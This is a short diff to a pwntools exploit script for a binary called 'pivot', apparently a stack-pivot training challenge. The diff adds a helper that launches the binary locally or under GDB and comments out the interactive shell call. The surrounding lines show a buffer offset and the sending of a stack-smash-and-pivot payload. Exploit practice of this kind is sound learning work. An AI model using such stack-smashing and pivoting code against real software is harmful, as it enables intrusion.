@@ -4,6 +4,13 @@ exe = context.binary = ELF("./pivot",checksec=False)
 context.log_level = 'debug'
 pty = process.PTY
 
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
 offset = 40
 
 foothold_plt = 0x400850
@@ -54,7 +61,7 @@ stack_smash_and_pivot = flat(
 # p.recvuntil("Now please send your stack smash")
 p.recvuntil('>')
 p.sendline(stack_smash_and_pivot)
-p.interactive()
+#p.interactive()
 # p.sendlineafter('>', stack_smash)
 # p.recvlines(2)
 # leaked_got_addr = p.recv()
